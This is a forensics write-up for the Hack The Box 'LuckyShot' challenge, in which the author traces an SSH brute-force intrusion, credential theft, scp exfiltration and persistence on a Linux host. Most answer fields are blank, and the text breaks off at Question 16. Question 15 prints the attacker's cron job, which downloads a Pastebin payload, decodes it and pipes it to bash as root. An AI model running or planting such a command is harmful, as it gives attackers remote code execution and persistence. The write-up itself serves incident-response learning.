
<p align="center">
  <!-- 🔥 ADD YOUR ROOM BANNER IMAGE HERE -->
  <!-- Example: assets/banner.png -->
  <img src="assets/banner.png" width="800">
</p>

<h1 align="center">🕵️ LuckyShot — Sherlock DFIR Write-Up</h1>

<p align="center">
  <b>Platform:</b> Hack The Box (Sherlock)<br>
  <b>Category:</b> Digital Forensics & Incident Response<br>
  <b>Difficulty:</b> Medium<br>
  <b>Author:</b> Shani Thakur<br>
  <b>Rank Achieved:</b> #169 🏆
</p>

<p align="center">
  <!-- 🔗 ADD SHERLOCK ROOM URL HERE -->
  <!-- Example: https://app.hackthebox.com/sherlocks/LuckyShot -->
  🔗 <a href="PASTE_SHERLOCK_ROOM_URL_HERE">Hack The Box — LuckyShot Sherlock</a>
</p>

---

## 🧠 Why This Write-Up Is Personal

LuckyShot was **not an easy Sherlock for me**.

Before this challenge, I had solved only **3–4 Sherlock rooms**, and most of the time I depended on **existing write-ups** to understand how DFIR investigations work.

But **LuckyShot had no public write-ups available online**.

No hints.  
No walkthroughs.  
No guidance.

This was the **first time** I solved a Sherlock **completely on my own**, with:
- Limited DFIR experience
- Many doubts
- And a lot of trial and error

That is why this write-up is written like a **story**, explaining:
- Where I got stuck
- What I was thinking at that time
- How I finally found the answers

---

## 📌 Machine Overview

The IT Manager of **Techniqua-Solutions Corp.** discovered that several critical files were missing, modified, or replaced with unknown files on his system.

As an **Incident Response Analyst**, I was provided with a forensic image of the IT Manager’s machine and tasked with investigating:

- Initial access method
- Attacker activity timeline
- Persistence techniques
- Data exfiltration
- Malware behavior

---

## 🛠️ Investigation Setup

- Operating System: Kali Linux
- Evidence Type: Forensic image & live response artifacts
- Key files analyzed:
  - `auth.log`
  - `.bash_history`
  - `cron.d`
  - `systemd services`
  - Executable hash lists

---

## 🧩 Task-by-Task Investigation

---

### 🔹 Task 1: Initial Access Method

**Question:**  
What method did the attacker use to gain access to the system?

**My Thinking:**  
Whenever unauthorized access is involved, the **first file** I check is `auth.log`.

**Analysis:**  
I noticed:
- A large number of `Failed password` entries
- Followed by a successful login

This pattern clearly indicates **SSH brute-force**.

**Answer:**

### 🧠 Explanation  
To identify the initial access method, I started by analyzing the `auth.log` file because it records authentication-related events.

Inside the log, I observed:
- A very large number of `Failed password` entries
- All attempts targeting SSH
- Followed by a successful login event

This pattern clearly indicates an **SSH brute-force attack**, where the attacker repeatedly tried different passwords until one succeeded.

---

## 🟢 Question 2  
### At what time did the attacker successfully log in for the first time?

### ✅ Answer

### 🧠 Explanation  
After identifying brute-force activity, I filtered the `auth.log` file to show only successful SSH logins using the `Accepted password` keyword.

The earliest successful login timestamp found in the logs confirmed the attacker’s first access time.

---

## 🟢 Question 3  
### Which user account was compromised by the attacker?

### ✅ Answer

### 🧠 Explanation  
The same successful login entry in `auth.log` also contained the username used during authentication.  
The attacker logged in using the **administrator** account, confirming it as the compromised user.

---

## 🟢 Question 4  
### What command was executed by the attacker to check user privileges?

### ✅ Answer

### 🧠 Explanation  
After gaining access, attackers often check their privilege level.

By reviewing the `.bash_history` file of the administrator user, I found the command `groups administrator`, which is commonly used to verify group memberships and privilege levels.

---

## 🟢 Question 5  
### What was the first tool the attacker downloaded to extract stored credentials from the system?

### ✅ Answer

### 🧠 Explanation  
While analyzing `.bash_history`, I noticed that the attacker cloned a GitHub repository.

Upon checking that repository online, I confirmed it was **LaZagne**, a well-known credential recovery tool used to extract stored passwords from systems. This clearly indicated the attacker’s intent to harvest credentials.

---

## 🟢 Question 6  
### The attacker located sensitive files on the system and transferred them to a remote machine.  
### Which command-line tool was used for this exfiltration?

### ✅ Answer

### 🧠 Explanation  
The `.bash_history` file contained multiple file transfer commands.  
The attacker used `scp`, a secure copy utility, to transfer sensitive files to a remote machine.

---

## 🟢 Question 7  
### What IP did the attacker exfiltrate the files to?

### ✅ Answer

### 🧠 Explanation  
The destination IP address was clearly visible in the `scp` command found in `.bash_history`.  
This IP belonged to the attacker’s machine and was used for data exfiltration.

---

## 🟢 Question 8  
### The attacker continued their exploitation and executed a malicious script.  
### What is the name of the script?

### ✅ Answer

### 🧠 Explanation  
Further inspection of `.bash_history` revealed execution of a suspicious shell script named `sys_monitor.sh`.  
The name was designed to appear legitimate, but it was later confirmed to be malicious.

---

## 🟢 Question 9  
### What is the SHA1 hash of the malware?

### ✅ Answer

### 🧠 Explanation  
Initially, I was unsure where to find malware hashes.

After exploring the provided folders, I found a directory named `hash_executables` containing hash lists. Since the question asked for a SHA1 hash, I searched the `hash_executables.sha1` file for `sys_monitor.sh` and successfully retrieved the hash value.

---

## 🟢 Question 10  
### The malware installed a component pretending to be a system network service.  
### What is the name of this component?

### ✅ Answer

### 🧠 Explanation  
This was one of the most time-consuming questions.

After checking multiple persistence locations, I examined `/etc/systemd/system/` and found a suspicious service named `systemd-networkm.service`.  
The name closely mimics legitimate system services, indicating an attempt to hide in plain sight while running with root privileges.

---

## 🟢 Question 11  
### The attacker modified startup configuration files to spawn network listeners.  
### Which file starts the listener on the lowest port number?

### ✅ Answer

### 🧠 Explanation  
This question took nearly a full day to solve.

I inspected:
- cron jobs
- systemd services
- profile scripts
- startup configuration files

Eventually, I discovered that the listener using the lowest port was initiated through the `.bashrc` file, which executes automatically when a user logs in.

---

## 🟢 Question 12  
### What is the username and hostname associated with the attacker?

### ✅ Answer

### 🧠 Explanation  
Multiple commands inside `.bash_history` revealed the attacker’s environment.  
The prompt clearly showed `kali@kali`, indicating both the username and hostname of the attacker’s system.

---

## 🟢 Question 13  
### The attacker created a user for persistence.  
### What is the name of the created user?

### ✅ Answer

### 🧠 Explanation  
To identify persistence mechanisms, I re-analyzed `auth.log` and filtered user creation events.  
This revealed that a new user named **Regev** was created by the attacker.

---

## 🟢 Question 14  
### At what exact timestamp was the new user created on the system?

### ✅ Answer

### 🧠 Explanation  
The same user creation log entry in `auth.log` included the timestamp, allowing me to identify the exact time the persistent user account was added.

---

## 🟢 Question 15  
### The malware fetched and executed a remote payload automatically.  
### What is the full command responsible for retrieving this payload?

### ✅ Answer  
```bash
/1 * * * root command -v curl >/dev/null 2>&1 || (apt update && apt install -y curl) && curl -fsSL https://pastebin.com/raw/SAuEez0S | rev | base64 -d | bash

### 🧠 Explanation
### Inside /etc/cron.d/, I discovered a malicious cron job named syscheck.
### This job ensured that the payload was repeatedly fetched, decoded, and executed, providing long-term persistence.
## 🟢 Question 16
### The payload was used to extract more sensitive files.
What command was executed to extract the sensitive file?
### ✅ Answer
